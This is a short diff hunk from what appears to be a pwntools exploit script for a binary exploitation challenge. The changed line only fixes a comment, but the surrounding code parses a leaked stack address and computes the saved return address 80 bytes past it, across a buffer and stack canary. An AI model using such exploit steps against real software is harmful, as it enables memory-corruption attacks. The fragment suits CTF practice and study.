@@ -37,7 +37,7 @@ io.recvuntil(b': [')
 stack = int(io.recvline()[:-2], 10)
 info("leaked stack address: %#x", stack)
 
-# offset to return address = 80 = buffer (64 bytes) + menu_option (8 bytes) + canary_offset (8 bytes)
+# offset to return address = 80 = buffer (64 bytes) + menu_option (8 bytes) + canary (8 bytes)
 ret = stack + 80
 info("return address: %#x", ret)
 
